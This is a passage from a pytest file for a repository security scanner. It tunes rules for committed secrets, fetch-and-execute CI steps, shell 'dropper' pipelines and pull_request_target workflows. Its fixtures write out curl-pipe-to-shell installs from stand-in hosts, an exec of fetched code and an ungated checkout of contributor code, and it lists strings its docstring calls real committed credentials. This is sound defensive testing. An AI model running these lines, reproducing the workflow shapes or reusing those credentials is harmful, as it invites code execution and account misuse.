    def test_a_pin_earlier_in_one_run_block_counts(self, tmp_path) -> None:
        """A workflow `run:` block is one script. The pin is two lines above the fetch and
        covers it, which a logical line alone would have refused."""
        workflows = tmp_path / ".github" / "workflows"
        workflows.mkdir(parents=True)
        (workflows / "ci.yml").write_text(
            "name: ci\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
            "    env:\n      FORC_VERSION: 0.66.5\n    steps:\n"
            "      - run: |\n"
            '          echo "installing forc"\n'
            "          curl -sSLf https://example.test/sway/releases/download/"
            "v${{ env.FORC_VERSION }}/forc.tar.gz -L -o forc.tar.gz\n"
            "          chmod +x forc-binaries/forc\n"
        )
        hits = self._fetch(tmp_path, "SUSPECT.CI.FETCH_EXEC.001")
        assert hits and all(f.severity <= Severity.MEDIUM for f in hits)


class TestSixShapesFromTheSecondReading:
    """The same seventy-repository sample, read again after the first seven fixes. Of 64
    fetchable findings 38 had stopped matching; these six shapes account for most of the
    rest, and they take the sample from 64 blocking to 15.

    What remains after them is the answer to the question, rather than a gap: ten of the
    fifteen are real committed credentials -- an OAuth client secret, a Dropbox token, a
    Coveralls repo token, a hardcoded private key -- and the other five are demo
    passwords that no shape test can tell from real ones.
    """

    @pytest.mark.parametrize(
        "value",
        [
            # Ruby's safe navigation is a separator like any other: the value reads a
            # property off another object and assigns no literal.
            b"proxy_uri&.password",
            # A literal with a shell variable on the end. `AWS4$AWS_SECRET_ACCESS_KEY`
            # is the SigV4 key-derivation prefix; the secret is in the environment.
            b"AWS4$AWS_SECRET_ACCESS_KEY",
            # A long list. js-beautify declares its void elements as one comma-separated
            # string of sixteen tag names, and a list is longer than it is wide.
            b"br,input,link,meta,source,!doctype,basefont,base,area,hr,wbr,param,img",
            # Symfony's console styles. Lowercase values only, which is what keeps an
            # Azure connection string out.
            b"fg=yellow;options=bold",
            # A path rooted at the home directory. Ray's cluster config names a key file
            # rather than holding one.
            b"~/ray-bootstrap-key.pem",
            # And a value that says what it is.
            b"hardcoded123",
        ],
    )
    def test_these_are_not_credentials(self, value: bytes) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert NOT_A_SECRET.match(value) is not None or PLACEHOLDER.search(value) is not None

    def test_an_azure_connection_string_is_not_a_console_style(self) -> None:
        """The control for the `key=value;key=value` shape, and the reason it admits only
        lowercase values: an Azure connection string is written the same way and its
        `AccountKey` is the whole point of the rule."""
        from cordon_scanner.detect.secrets import PLACEHOLDER

        value = (
            b"DefaultEndpointsProtocol=https;AccountName=x;AccountKey="
            b"Xk9mQ2vB7wRtY4uZp1LsDy3Fz6Hj0Cg5Aq2EgHj0Cg5AqB7xQ2mVt9Xb1NpLr4Ws8Dy3Fz6Hj=="
        )
        assert NOT_A_SECRET.match(value) is None
        assert PLACEHOLDER.search(value) is None

    @pytest.mark.parametrize(
        "value",
        [
            b"wLc4dpQvRt8mK1nS9jH2fXaU7yEoB3iZ6vNqTgCkW5A",
            b"4byOdcHPvnUGJ5DL2cwLZccI5HUKKxkVJ",
            b"aB3xK9mW2pQ7vL4nR8sT1yU6hD0jF5cG",
            b"hc2wb63opyfxnwn",
            b"sec-01e0d4agf6pfvwdjwxp61n3fvg",
            b"lsACyCD94FhDUtGTXi3QzcFE2uU1hqtDaKeqrdwj",
            b"yku5ej8nvfaor28lvtrabcx0wkrpkztz",
            b"gsKnGZ041HLL4IM8",
        ],
    )
    def test_the_ten_that_are_real_still_are(self, value: bytes) -> None:
        """Eight of the ten real credentials left in the sample, asserted against every
        widening in this file. These are committed to public repositories by people who
        meant to, and they are what the rule is for."""
        from cordon_scanner.detect.secrets import PLACEHOLDER, is_password_hash, looks_sequential

        assert NOT_A_SECRET.match(value) is None
        assert PLACEHOLDER.search(value) is None
        assert not is_password_hash(value)
        assert not looks_sequential(value)


class TestThreeRulesThatAskedTooLittle:
    """Three narrowings from the mid-sized classes, each the same shape of defect: the
    rule's message claims a condition the pattern did not check."""

    def test_a_doctest_is_not_code(self, tmp_path) -> None:
        """`>>>` and `...` are Python's doctest prompts. `aiohttp`'s own docstrings open
        a session in one and `diffusers` fetches an image with `requests.get` in one, and
        the capability detector read both as code -- the secrets detector has asked this
        question since its second release and this one did not."""
        (tmp_path / "client.py").write_text(
            '"""An HTTP client.\n\nUsage::\n\n'
            "    >>> import aiohttp\n"
            "    >>> async with aiohttp.request('GET', 'http://python.org/') as resp:\n"
            "    ...     body = await resp.read()\n"
            "    >>> exec(compile(body, 'x', 'exec'))\n"
            '"""\n\n\ndef fetch(url):\n    return url\n'
        )
        assert Scanner().scan(tmp_path).findings == ()

    def test_a_cookie_name_is_not_a_token(self, tmp_path) -> None:
        """`harness` sets `ENV GITNESS_TOKEN_COOKIE_NAME=token`, which names the cookie a
        token travels in. A value that is the word `token` is the word."""
        (tmp_path / "Dockerfile").write_text(
            "FROM alpine:3.20\n"
            "ENV GITNESS_TOKEN_COOKIE_NAME=token\n"
            "ENV SA_PASSWORD=$MSSQL_PASSWORD\n"
            "ARG SCCACHE_S3_NO_CREDENTIALS=0\n"
            "ENV DB_PASSWORD=Xk9mQ2vB7wRtY4uZp1Ls\n"
        )
        hits = [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.CONTAINER.BUILD_SECRET.001"
        ]
        assert len(hits) == 1, [(f.location.line, f.evidence.snippet) for f in hits]
        assert hits[0].location.line == 5

    def test_a_job_gated_on_a_named_actor(self, tmp_path) -> None:
        """`discourse/discourse` checks a pull request body under `pull_request_target`,
        checks out the head, and gates the whole job on the author being dependabot. A
        login cannot be spoofed and dependabot takes no contributions, so the condition is
        the control -- and it is the one GitHub's own documentation recommends."""
        workflows = tmp_path / ".github" / "workflows"
        workflows.mkdir(parents=True)
        (workflows / "gated.yml").write_text(
            "name: check-pr-body\n"
            "on:\n  pull_request_target:\n    types: [opened, edited]\n"
            "jobs:\n  sanitize:\n"
            "    if: github.event.pull_request.user.login == 'dependabot[bot]'\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n      - uses: actions/checkout@v7\n"
            "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
        )
        hits = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.CI.PR_TARGET.001"
        ]
        assert hits and all(f.severity <= Severity.MEDIUM for f in hits)

    def test_an_ungated_checkout_still_blocks(self, tmp_path) -> None:
        """The control, and the shape the rule is named for: `doocs/leetcode` runs
        prettier over a contributor's branch under `pull_request_target` and commits."""
        workflows = tmp_path / ".github" / "workflows"
        workflows.mkdir(parents=True)
        (workflows / "open.yml").write_text(
            "name: prettier-write\n"
            "on:\n  pull_request_target:\n    types: [opened, synchronize]\n"
            "jobs:\n  write:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - uses: actions/checkout@v7\n"
            "        with:\n          ref: ${{ github.event.pull_request.head.ref }}\n"
            "      - run: npx prettier --write .\n"
        )
        assert [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.CI.PR_TARGET.001" and f.severity >= Severity.HIGH
        ]


class TestPipingIntoAProgramIsNotPipingIntoAnInterpreter:
    """On the third corpus pass `SUSPECT.DROPPER.001` became the largest remaining
    blocker at 39 repositories, and two classes account for much of it.

    A `|` inside QUOTES is not a pipeline, because the shell never sees it as one.
    `_is_printed_text` already knew this and required a printer in front of the quotes,
    which was the conservative first cut: what the string is used for does not change
    whether the pipe is data. `arg0="curl -fsSL https://code-server.dev/install.sh |
    sh -s --"`, `check_prereq bun "Install: curl -fsSL https://bun.sh/install | bash"`
    and an error message about curl being absent are a variable, a function argument and
    a diagnostic, and none is a pipeline.

    And an interpreter reading its PROGRAM from the pipe is the whole claim.
    `nmap`'s `checklibs.sh` asks a release page what the latest version of PCRE2 is:

        curl -Ls "$PCRE_SOURCE" | perl -lne 'if(m|tag/pcre2-(\\d+)|){print $1}'

    The program is the quoted one-liner; the fetched bytes are its input. A code flag --
    `-e`, `-c`, `-n`, `-l`, `-p` -- says so. `sh -s` does not, because it reads stdin and
    passes the rest as positional arguments, which is exactly how
    `curl https://sh.rustup.rs | sh -s -- -y` works.
    """

    def _dropper(self, tmp_path):
        return [f for f in Scanner().scan(tmp_path).findings if "DROPPER" in f.rule_id]

    def test_install_instructions_in_a_string(self, tmp_path) -> None:
        (tmp_path / "bootstrap.sh").write_text(
            "#!/usr/bin/env bash\n"
            'SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"\n'
            'arg0="curl -fsSL https://code-server.test/install.sh | sh -s --"\n'
            'check_prereq bun "Install: curl -fsSL https://bun.test/install | bash"\n'
            "decoded=$(printf '%s' \"$BLOB\" | base64 -d)\n"
        )
        assert all(f.severity <= Severity.MEDIUM for f in self._dropper(tmp_path))

    def test_fetching_a_page_to_read_a_version(self, tmp_path) -> None:
        (tmp_path / "checklibs.sh").write_text(
            "#!/bin/sh\n"
            "eval $(grep '^PCRE2_MAJOR=' $NDIR/libpcre/configure)\n"
            "PCRE_LATEST=$(curl -Ls -I $PCRE_SOURCE"
            " | perl -lne 'if(m|tag/pcre2-(\\d+.\\d+)|){print $1;exit(0)}')\n"
            "PCAP_LATEST=$(curl -Ls $PCAP_SOURCE"
            " | perl -lne 'if(/libpcap-([\\d.]+).tar.gz/){print $1}')\n"
        )
        assert self._dropper(tmp_path) == []

    def test_an_unquoted_pipe_into_a_shell_still_blocks(self, tmp_path) -> None:
        """The control for the first half."""
        (tmp_path / "install.sh").write_text(
            "#!/usr/bin/env bash\n"
            'SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"\n'
            "curl -fsSL https://opencode.test/install | bash\n"
            "decoded=$(printf '%s' \"$BLOB\" | base64 -d)\n"
        )
        assert [f for f in self._dropper(tmp_path) if f.severity >= Severity.HIGH]

    def test_sh_dash_s_still_blocks(self, tmp_path) -> None:
        """The control for the second half, and the reason `-s` is not in the flag list:
        it reads stdin and passes the rest as positional arguments, which is how rustup's
        own documented install line works."""
        (tmp_path / "build-docs.sh").write_text(
            "#!/usr/bin/env bash\n"
            "set -euo pipefail\n"
            "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.test | sh -s -- -y\n"
            "curl -LsSf https://astral.test/uv/install.sh | sh\n"
        )
        assert [f for f in self._dropper(tmp_path) if f.severity >= Severity.HIGH]


class TestHelpTextIsNotAPipelineStep:
    """`SUSPECT.CI.FETCH_EXEC.001`'s message is "a pipeline STEP downloads something and
    runs it", and the pattern matched any occurrence anywhere in a workflow file. An
    action that documents its own installer in an input description --

        description: 'How it gets installed. Supported: installer-script
                      (curl | bash one-liner), or desktop-installer@latest'

    -- is help text for a form field. `in_shell` is the condition the
    expression-injection rule beside it already uses.
    """

    def test_an_action_input_description(self, tmp_path) -> None:
        action = tmp_path / ".github" / "actions" / "setup"
        action.mkdir(parents=True)
        (action / "action.yml").write_text(
            "name: setup\ndescription: Install the toolchain\n"
            "inputs:\n  method:\n"
            "    description: 'How it gets installed. Supported: installer-script"
            " (curl | bash one-liner), or desktop-installer@latest'\n"
            "    required: false\n"
            "runs:\n  using: composite\n  steps:\n"
            "    - run: echo ready\n      shell: bash\n"
        )
        assert not [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.CI.FETCH_EXEC.001"
        ]

    def test_a_run_step_still_blocks(self, tmp_path) -> None:
        workflows = tmp_path / ".github" / "workflows"
        workflows.mkdir(parents=True)
        (workflows / "ci.yml").write_text(
            "name: ci\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: curl -LsSf https://astral.test/uv/install.sh | sh\n"
        )
        assert [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.CI.FETCH_EXEC.001" and f.severity >= Severity.HIGH
        ]

    def test_a_block_scalar_run_step_still_blocks(self, tmp_path) -> None:
        """The shape the shell-region finder has to get right for this to be safe: a
        `run: |` block is where most of these actually live."""
        workflows = tmp_path / ".github" / "workflows"
        workflows.mkdir(parents=True)
        (workflows / "ci.yml").write_text(
            "name: ci\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: |\n"
            "          echo installing\n"
            "          curl -fsSL https://opencode.test/install | bash\n"
        )
        assert [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.CI.FETCH_EXEC.001" and f.severity >= Severity.HIGH
        ]
